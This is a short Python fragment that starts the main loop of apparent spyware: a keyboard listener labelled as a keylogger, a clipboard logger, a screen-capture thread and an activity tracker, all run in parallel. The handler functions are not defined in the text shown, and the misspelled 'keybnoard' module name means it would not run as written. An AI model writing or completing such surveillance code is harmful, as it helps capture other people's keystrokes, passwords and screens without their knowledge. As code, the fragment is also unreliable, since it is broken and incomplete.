import threading 

# Commence Keylogger

listener = keybnoard.Listener(on_press=on_press)

listener.start()

# Start clipboard logger

clipboardThread = threading.Thread(target=logClipboard)
clipboardThread.start()

# Start Screen capture

screen_thread = threading.Thread(target=captureScreen)
screen_thread.start()

# Start activity tracker

activityThread = threading.Thread(target=trackActivity)

activityThread.start()

listener.join()

clipboardThread.join()

screen_thread.join()

activityThread.join()
